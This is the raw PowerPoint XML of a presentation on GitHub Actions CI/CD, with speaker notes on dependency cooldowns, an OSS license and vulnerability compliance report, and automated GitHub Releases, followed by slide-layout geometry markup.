              <a:t>Cooldown waits 7 days before proposing a brand-new release. Most malicious package versions are detected and removed within days, so this protects us from supply-chain attacks. Security updates are not delayed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ignore rules document deliberate holds: TypeScript 7 is skipped until typescript-eslint supports it.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}"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OSS compliance report is built, the same way for both projects.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Step 1 collects every package with its version and license: pnpm has a built-in "pnpm licenses list --json"; for Maven we generate a CycloneDX SBOM, once with runtime dependencies only and once including test scope, so we know which packages ship.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Step 2 scans the same packages with OSV-Scanner, which queries the OSV database (GitHub Advisory, NVD and more).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Step 3 is a small Node script with no dependencies. It reads oss-policy.json, classifies each license and vulnerability, and decides Passed, Restrictive or Fail.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Step 4 uploads the CSV as an artifact (also when the policy fails) and writes a summary table on the run page. A third job merges both CSVs into oss-report-all.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>It runs on dependency changes, on PRs, daily (new CVEs appear for unchanged dependencies) and on demand.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}"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has three outcomes, defined in one JSON file that Legal or the security team can review.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Passed: an approved permissive license and no vulnerability at a restricted severity.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Restrictive: does not fail the build but needs a human look. Copyleft licenses like LGPL, MPL or EPL have obligations; an unknown license must be identified; a moderate CVE should be planned.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Fail: a denied license (GPL, AGPL, SSPL...) in something we ship, or a high or critical vulnerability. The job fails.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Dev-only dependencies are relaxed: a GPL test tool is not distributed, so it is Restrictive rather than Fail.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Real numbers from the demo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>: ts-app has 150 packages, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>2 restrictive (lightningcss, MPL-2.0, a dev-only build tool</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>). java-app has 16, 6 restrictive: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JUnit is EPL-2.0, test scope only.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}"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reviewer downloads: Actions → OSS Compliance run → Artifacts → oss-report-all. It opens directly in Excel.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Rows are sorted Fail first, then Restrictive, then Passed, so the action items are on top.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The last row is an illustrative example of a Fail (an old log4j version); it is not in the demo projects.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The same table appears as a job summary on the run page, so most of the time you do not even need to download it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Note the CSV writer escapes cells that start with = + or -, so a malicious package name cannot inject an Excel formula.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}"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 workflow, identical in shape for both projects.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Trigger: a push to main that touches package.json (or pom.xml), or the Run workflow button.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The first job reads the version and checks whether a tag like ts-app-v1.0.1 already exists. If it exists, nothing happens: changing a script in package.json does not redeploy. A manual run always deploys.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Then it calls the CI workflow itself through workflow_call, so the deployed build passed exactly the same gates as a PR.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>The release job only runs from main (if: github.ref == 'refs/heads/main'), so Run workflow on a feature branch cannot release. Environments with required reviewers would add a manual approval, but in a private repository they need GitHub Enterprise.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Finally the release job builds the tarball or JAR (plus SBOM for Java) and creates the GitHub Release with generated notes. In a real project this last step becomes npm publish, a container push, or a cloud deploy.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}"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 here means: create a GitHub Release automatically. No workflow artifact in between.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The release job checks out the exact commit that passed CI, builds the package itself, and calls gh release create. It builds without the dependency cache, so a poisoned cache can never end up in a released file.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>What you get: a tag (ts-app-v1.0.1), release notes generated from the pull requests merged since the previous release of the same project, the package attached (.tgz, or .jar plus SBOM for Java), and a permanent download link.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Why not an artifact? Artifacts expire, need a GitHub login and are tied to a workflow run, not to a version. A Release is the right home for something you ship.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>In a real project you extend this step: npm publish, push a container, deploy to a server.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}"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avoid copy-paste in GitHub Actions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A composite action bundles STEPS. setup-ts installs pnpm, Node.js with the pnpm store cache, and the dependencies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>. Nine jobs use it </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>with one line.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A reusable workflow bundles whole JOBS. ts-ci.yml declares workflow_call, and ts-deploy.yml runs it as a single job, so deploy and PR checks can never drift apart.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Both are referenced with $/, the self-repository syntax: it always resolves to this repository at the running commit and does not need a checkout. On GitHub Enterprise Server use ./ instead.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}"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four takeaways and the next steps to roll this out.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The templates in the demo repository are ready to copy: change the paths and the commands, keep the structure.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>For next steps: protect main with required status checks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>, turn on secret scanning and push protection (free for public repositories), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>consider artifact attestations to prove where a build came from, and agree the license policy with Legal before enforcing Fail on existing projects.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Questions?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}" type="slidenum">
              <a:rPr lang="en-US"/>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表紙用">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="bg2"/>
        </a:solidFill>
        <a:effectLst/>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="20" name="図 19" descr="草, スポーツゲーム, フィールド が含まれている画像&#10;&#10;AI 生成コンテンツは誤りを含む可能性があります。">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7BBD16A2-5EE0-F5AB-5B8B-64BC0C1BC23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H="1">
            <a:off x="-1" y="2752078"/>
            <a:ext cx="12192000" cy="4114467"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="フリーフォーム: 図形 20">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1884EE6E-3E92-03A4-B8D6-58EF134C2A83}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-6786" y="-2379"/>
            <a:ext cx="12203469" cy="5982686"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="csX0" fmla="*/ 146304 w 4873752"/>
              <a:gd name="csY0" fmla="*/ 2569464 h 2569464"/>
              <a:gd name="csX1" fmla="*/ 2011680 w 4873752"/>
              <a:gd name="csY1" fmla="*/ 1600200 h 2569464"/>
              <a:gd name="csX2" fmla="*/ 4873752 w 4873752"/>
              <a:gd name="csY2" fmla="*/ 1005840 h 2569464"/>
              <a:gd name="csX3" fmla="*/ 4873752 w 4873752"/>
              <a:gd name="csY3" fmla="*/ 0 h 2569464"/>
              <a:gd name="csX4" fmla="*/ 0 w 4873752"/>
              <a:gd name="csY4" fmla="*/ 0 h 2569464"/>
              <a:gd name="csX5" fmla="*/ 146304 w 4873752"/>
              <a:gd name="csY5" fmla="*/ 2569464 h 2569464"/>
              <a:gd name="csX0" fmla="*/ 146304 w 4873752"/>
              <a:gd name="csY0" fmla="*/ 2569464 h 2569464"/>
              <a:gd name="csX1" fmla="*/ 2057400 w 4873752"/>
              <a:gd name="csY1" fmla="*/ 1591056 h 2569464"/>
              <a:gd name="csX2" fmla="*/ 4873752 w 4873752"/>
              <a:gd name="csY2" fmla="*/ 1005840 h 2569464"/>
              <a:gd name="csX3" fmla="*/ 4873752 w 4873752"/>
              <a:gd name="csY3" fmla="*/ 0 h 2569464"/>
              <a:gd name="csX4" fmla="*/ 0 w 4873752"/>
              <a:gd name="csY4" fmla="*/ 0 h 2569464"/>
              <a:gd name="csX5" fmla="*/ 146304 w 4873752"/>
              <a:gd name="csY5" fmla="*/ 2569464 h 2569464"/>
              <a:gd name="csX0" fmla="*/ 146304 w 4873752"/>
              <a:gd name="csY0" fmla="*/ 2569464 h 2569464"/>
              <a:gd name="csX1" fmla="*/ 2057400 w 4873752"/>
              <a:gd name="csY1" fmla="*/ 1591056 h 2569464"/>
              <a:gd name="csX2" fmla="*/ 4873752 w 4873752"/>
              <a:gd name="csY2" fmla="*/ 1005840 h 2569464"/>
              <a:gd name="csX3" fmla="*/ 4873752 w 4873752"/>
              <a:gd name="csY3" fmla="*/ 0 h 2569464"/>
              <a:gd name="csX4" fmla="*/ 0 w 4873752"/>
              <a:gd name="csY4" fmla="*/ 0 h 2569464"/>
              <a:gd name="csX5" fmla="*/ 146304 w 4873752"/>
              <a:gd name="csY5" fmla="*/ 2569464 h 2569464"/>
              <a:gd name="csX0" fmla="*/ 146304 w 4873752"/>
              <a:gd name="csY0" fmla="*/ 2569464 h 2569464"/>
              <a:gd name="csX1" fmla="*/ 2057400 w 4873752"/>
              <a:gd name="csY1" fmla="*/ 1591056 h 2569464"/>
              <a:gd name="csX2" fmla="*/ 4873752 w 4873752"/>
              <a:gd name="csY2" fmla="*/ 1005840 h 2569464"/>
              <a:gd name="csX3" fmla="*/ 4873752 w 4873752"/>
              <a:gd name="csY3" fmla="*/ 0 h 2569464"/>
              <a:gd name="csX4" fmla="*/ 0 w 4873752"/>
              <a:gd name="csY4" fmla="*/ 0 h 2569464"/>
              <a:gd name="csX5" fmla="*/ 146304 w 4873752"/>
              <a:gd name="csY5" fmla="*/ 2569464 h 2569464"/>
              <a:gd name="csX0" fmla="*/ 146304 w 4873752"/>
              <a:gd name="csY0" fmla="*/ 2569464 h 2584262"/>
              <a:gd name="csX1" fmla="*/ 4873752 w 4873752"/>
              <a:gd name="csY1" fmla="*/ 1005840 h 2584262"/>
              <a:gd name="csX2" fmla="*/ 4873752 w 4873752"/>
              <a:gd name="csY2" fmla="*/ 0 h 2584262"/>
              <a:gd name="csX3" fmla="*/ 0 w 4873752"/>
              <a:gd name="csY3" fmla="*/ 0 h 2584262"/>
              <a:gd name="csX4" fmla="*/ 146304 w 4873752"/>
              <a:gd name="csY4" fmla="*/ 2569464 h 2584262"/>
              <a:gd name="csX0" fmla="*/ 146304 w 4873752"/>
              <a:gd name="csY0" fmla="*/ 2569464 h 2569464"/>
              <a:gd name="csX1" fmla="*/ 4873752 w 4873752"/>
              <a:gd name="csY1" fmla="*/ 1005840 h 2569464"/>
              <a:gd name="csX2" fmla="*/ 4873752 w 4873752"/>
              <a:gd name="csY2" fmla="*/ 0 h 2569464"/>
              <a:gd name="csX3" fmla="*/ 0 w 4873752"/>
              <a:gd name="csY3" fmla="*/ 0 h 2569464"/>
              <a:gd name="csX4" fmla="*/ 146304 w 4873752"/>
              <a:gd name="csY4" fmla="*/ 2569464 h 2569464"/>
              <a:gd name="csX0" fmla="*/ 146304 w 4873752"/>
              <a:gd name="csY0" fmla="*/ 2569464 h 2569464"/>
              <a:gd name="csX1" fmla="*/ 4873752 w 4873752"/>
              <a:gd name="csY1" fmla="*/ 1005840 h 2569464"/>
              <a:gd name="csX2" fmla="*/ 4873752 w 4873752"/>
              <a:gd name="csY2" fmla="*/ 0 h 2569464"/>
              <a:gd name="csX3" fmla="*/ 0 w 4873752"/>
              <a:gd name="csY3" fmla="*/ 0 h 2569464"/>
              <a:gd name="csX4" fmla="*/ 146304 w 4873752"/>
              <a:gd name="csY4" fmla="*/ 2569464 h 2569464"/>
              <a:gd name="csX0" fmla="*/ 0 w 5409173"/>
              <a:gd name="csY0" fmla="*/ 3113080 h 3113080"/>
              <a:gd name="csX1" fmla="*/ 5409173 w 5409173"/>
              <a:gd name="csY1" fmla="*/ 1005840 h 3113080"/>
              <a:gd name="csX2" fmla="*/ 5409173 w 5409173"/>
              <a:gd name="csY2" fmla="*/ 0 h 3113080"/>
              <a:gd name="csX3" fmla="*/ 535421 w 5409173"/>
              <a:gd name="csY3" fmla="*/ 0 h 3113080"/>
              <a:gd name="csX4" fmla="*/ 0 w 5409173"/>
              <a:gd name="csY4" fmla="*/ 3113080 h 3113080"/>
              <a:gd name="csX0" fmla="*/ 0 w 5409173"/>
              <a:gd name="csY0" fmla="*/ 3113080 h 3113080"/>
              <a:gd name="csX1" fmla="*/ 5409173 w 5409173"/>
              <a:gd name="csY1" fmla="*/ 1005840 h 3113080"/>
              <a:gd name="csX2" fmla="*/ 5409173 w 5409173"/>
              <a:gd name="csY2" fmla="*/ 0 h 3113080"/>
              <a:gd name="csX3" fmla="*/ 535421 w 5409173"/>
              <a:gd name="csY3" fmla="*/ 0 h 3113080"/>
              <a:gd name="csX4" fmla="*/ 0 w 5409173"/>
              <a:gd name="csY4" fmla="*/ 3113080 h 3113080"/>
              <a:gd name="csX0" fmla="*/ 0 w 5409173"/>
              <a:gd name="csY0" fmla="*/ 3113080 h 3113080"/>
              <a:gd name="csX1" fmla="*/ 5409173 w 5409173"/>
              <a:gd name="csY1" fmla="*/ 1005840 h 3113080"/>
              <a:gd name="csX2" fmla="*/ 5409173 w 5409173"/>
              <a:gd name="csY2" fmla="*/ 0 h 3113080"/>
              <a:gd name="csX3" fmla="*/ 535421 w 5409173"/>
              <a:gd name="csY3" fmla="*/ 0 h 3113080"/>
              <a:gd name="csX4" fmla="*/ 0 w 5409173"/>
              <a:gd name="csY4" fmla="*/ 3113080 h 3113080"/>
              <a:gd name="csX0" fmla="*/ 0 w 5501549"/>
              <a:gd name="csY0" fmla="*/ 2943757 h 2943757"/>
              <a:gd name="csX1" fmla="*/ 5501549 w 5501549"/>
              <a:gd name="csY1" fmla="*/ 1005840 h 2943757"/>
              <a:gd name="csX2" fmla="*/ 5501549 w 5501549"/>
              <a:gd name="csY2" fmla="*/ 0 h 2943757"/>
              <a:gd name="csX3" fmla="*/ 627797 w 5501549"/>
              <a:gd name="csY3" fmla="*/ 0 h 2943757"/>
              <a:gd name="csX4" fmla="*/ 0 w 5501549"/>
              <a:gd name="csY4" fmla="*/ 2943757 h 2943757"/>
              <a:gd name="csX0" fmla="*/ 0 w 5501549"/>
              <a:gd name="csY0" fmla="*/ 2943757 h 2943757"/>
              <a:gd name="csX1" fmla="*/ 5501549 w 5501549"/>
              <a:gd name="csY1" fmla="*/ 1005840 h 2943757"/>
              <a:gd name="csX2" fmla="*/ 5501549 w 5501549"/>
              <a:gd name="csY2" fmla="*/ 0 h 2943757"/>
              <a:gd name="csX3" fmla="*/ 627797 w 5501549"/>
              <a:gd name="csY3" fmla="*/ 0 h 2943757"/>
              <a:gd name="csX4" fmla="*/ 0 w 5501549"/>
              <a:gd name="csY4" fmla="*/ 2943757 h 2943757"/>
              <a:gd name="csX0" fmla="*/ 0 w 5501549"/>
              <a:gd name="csY0" fmla="*/ 2943757 h 2943757"/>
              <a:gd name="csX1" fmla="*/ 5501549 w 5501549"/>
              <a:gd name="csY1" fmla="*/ 1005840 h 2943757"/>
              <a:gd name="csX2" fmla="*/ 5501549 w 5501549"/>
              <a:gd name="csY2" fmla="*/ 0 h 2943757"/>
              <a:gd name="csX3" fmla="*/ 627797 w 5501549"/>
              <a:gd name="csY3" fmla="*/ 0 h 2943757"/>
              <a:gd name="csX4" fmla="*/ 0 w 5501549"/>
              <a:gd name="csY4" fmla="*/ 2943757 h 2943757"/>
              <a:gd name="csX0" fmla="*/ 0 w 5501549"/>
              <a:gd name="csY0" fmla="*/ 2943757 h 2943757"/>
              <a:gd name="csX1" fmla="*/ 5493850 w 5501549"/>
              <a:gd name="csY1" fmla="*/ 1344486 h 2943757"/>
              <a:gd name="csX2" fmla="*/ 5501549 w 5501549"/>
              <a:gd name="csY2" fmla="*/ 0 h 2943757"/>
              <a:gd name="csX3" fmla="*/ 627797 w 5501549"/>
              <a:gd name="csY3" fmla="*/ 0 h 2943757"/>
              <a:gd name="csX4" fmla="*/ 0 w 5501549"/>
              <a:gd name="csY4" fmla="*/ 2943757 h 2943757"/>
              <a:gd name="csX0" fmla="*/ 0 w 5963430"/>
              <a:gd name="csY0" fmla="*/ 3095257 h 3095257"/>
              <a:gd name="csX1" fmla="*/ 5955731 w 5963430"/>
              <a:gd name="csY1" fmla="*/ 1344486 h 3095257"/>
              <a:gd name="csX2" fmla="*/ 5963430 w 5963430"/>
              <a:gd name="csY2" fmla="*/ 0 h 3095257"/>
              <a:gd name="csX3" fmla="*/ 1089678 w 5963430"/>
              <a:gd name="csY3" fmla="*/ 0 h 3095257"/>
              <a:gd name="csX4" fmla="*/ 0 w 5963430"/>
              <a:gd name="csY4" fmla="*/ 3095257 h 3095257"/>
              <a:gd name="csX0" fmla="*/ 3829362 w 9792792"/>
              <a:gd name="csY0" fmla="*/ 3095257 h 3095257"/>
              <a:gd name="csX1" fmla="*/ 9785093 w 9792792"/>
              <a:gd name="csY1" fmla="*/ 1344486 h 3095257"/>
              <a:gd name="csX2" fmla="*/ 9792792 w 9792792"/>
              <a:gd name="csY2" fmla="*/ 0 h 3095257"/>
              <a:gd name="csX3" fmla="*/ 0 w 9792792"/>
              <a:gd name="csY3" fmla="*/ 26735 h 3095257"/>
              <a:gd name="csX4" fmla="*/ 3829362 w 9792792"/>
              <a:gd name="csY4" fmla="*/ 3095257 h 3095257"/>
              <a:gd name="csX0" fmla="*/ 3829362 w 9792792"/>
              <a:gd name="csY0" fmla="*/ 3095257 h 3095257"/>
              <a:gd name="csX1" fmla="*/ 9785093 w 9792792"/>
              <a:gd name="csY1" fmla="*/ 1344486 h 3095257"/>
              <a:gd name="csX2" fmla="*/ 9792792 w 9792792"/>
              <a:gd name="csY2" fmla="*/ 0 h 3095257"/>
              <a:gd name="csX3" fmla="*/ 0 w 9792792"/>
              <a:gd name="csY3" fmla="*/ 26735 h 3095257"/>
              <a:gd name="csX4" fmla="*/ 1779153 w 9792792"/>
              <a:gd name="csY4" fmla="*/ 1464601 h 3095257"/>
              <a:gd name="csX5" fmla="*/ 3829362 w 9792792"/>
              <a:gd name="csY5" fmla="*/ 3095257 h 3095257"/>
              <a:gd name="csX0" fmla="*/ 3829362 w 9792792"/>
              <a:gd name="csY0" fmla="*/ 3095257 h 3122184"/>
              <a:gd name="csX1" fmla="*/ 9785093 w 9792792"/>
              <a:gd name="csY1" fmla="*/ 1344486 h 3122184"/>
              <a:gd name="csX2" fmla="*/ 9792792 w 9792792"/>
              <a:gd name="csY2" fmla="*/ 0 h 3122184"/>
              <a:gd name="csX3" fmla="*/ 0 w 9792792"/>
              <a:gd name="csY3" fmla="*/ 26735 h 3122184"/>
              <a:gd name="csX4" fmla="*/ 31701 w 9792792"/>
              <a:gd name="csY4" fmla="*/ 3122184 h 3122184"/>
              <a:gd name="csX5" fmla="*/ 3829362 w 9792792"/>
              <a:gd name="csY5" fmla="*/ 3095257 h 3122184"/>
              <a:gd name="csX0" fmla="*/ 3829362 w 9792792"/>
              <a:gd name="csY0" fmla="*/ 3095257 h 3374720"/>
              <a:gd name="csX1" fmla="*/ 9785093 w 9792792"/>
              <a:gd name="csY1" fmla="*/ 1344486 h 3374720"/>
              <a:gd name="csX2" fmla="*/ 9792792 w 9792792"/>
              <a:gd name="csY2" fmla="*/ 0 h 3374720"/>
              <a:gd name="csX3" fmla="*/ 0 w 9792792"/>
              <a:gd name="csY3" fmla="*/ 26735 h 3374720"/>
              <a:gd name="csX4" fmla="*/ 31701 w 9792792"/>
              <a:gd name="csY4" fmla="*/ 3122184 h 3374720"/>
              <a:gd name="csX5" fmla="*/ 3829362 w 9792792"/>
              <a:gd name="csY5" fmla="*/ 3095257 h 3374720"/>
              <a:gd name="csX0" fmla="*/ 3829362 w 9792792"/>
              <a:gd name="csY0" fmla="*/ 3095257 h 3439949"/>
              <a:gd name="csX1" fmla="*/ 9785093 w 9792792"/>
              <a:gd name="csY1" fmla="*/ 1344486 h 3439949"/>
              <a:gd name="csX2" fmla="*/ 9792792 w 9792792"/>
              <a:gd name="csY2" fmla="*/ 0 h 3439949"/>
              <a:gd name="csX3" fmla="*/ 0 w 9792792"/>
              <a:gd name="csY3" fmla="*/ 26735 h 3439949"/>
              <a:gd name="csX4" fmla="*/ 31701 w 9792792"/>
              <a:gd name="csY4" fmla="*/ 3122184 h 3439949"/>
              <a:gd name="csX5" fmla="*/ 3829362 w 9792792"/>
              <a:gd name="csY5" fmla="*/ 3095257 h 3439949"/>
              <a:gd name="csX0" fmla="*/ 3829362 w 9792792"/>
              <a:gd name="csY0" fmla="*/ 3095257 h 3439949"/>
              <a:gd name="csX1" fmla="*/ 9785093 w 9792792"/>
              <a:gd name="csY1" fmla="*/ 1594015 h 3439949"/>
              <a:gd name="csX2" fmla="*/ 9792792 w 9792792"/>
              <a:gd name="csY2" fmla="*/ 0 h 3439949"/>
              <a:gd name="csX3" fmla="*/ 0 w 9792792"/>
              <a:gd name="csY3" fmla="*/ 26735 h 3439949"/>
              <a:gd name="csX4" fmla="*/ 31701 w 9792792"/>
              <a:gd name="csY4" fmla="*/ 3122184 h 3439949"/>
              <a:gd name="csX5" fmla="*/ 3829362 w 9792792"/>
              <a:gd name="csY5" fmla="*/ 3095257 h 3439949"/>
              <a:gd name="csX0" fmla="*/ 4175773 w 9792792"/>
              <a:gd name="csY0" fmla="*/ 3113081 h 3446408"/>
              <a:gd name="csX1" fmla="*/ 9785093 w 9792792"/>
              <a:gd name="csY1" fmla="*/ 1594015 h 3446408"/>
              <a:gd name="csX2" fmla="*/ 9792792 w 9792792"/>
              <a:gd name="csY2" fmla="*/ 0 h 3446408"/>
              <a:gd name="csX3" fmla="*/ 0 w 9792792"/>
              <a:gd name="csY3" fmla="*/ 26735 h 3446408"/>
              <a:gd name="csX4" fmla="*/ 31701 w 9792792"/>
              <a:gd name="csY4" fmla="*/ 3122184 h 3446408"/>
              <a:gd name="csX5" fmla="*/ 4175773 w 9792792"/>
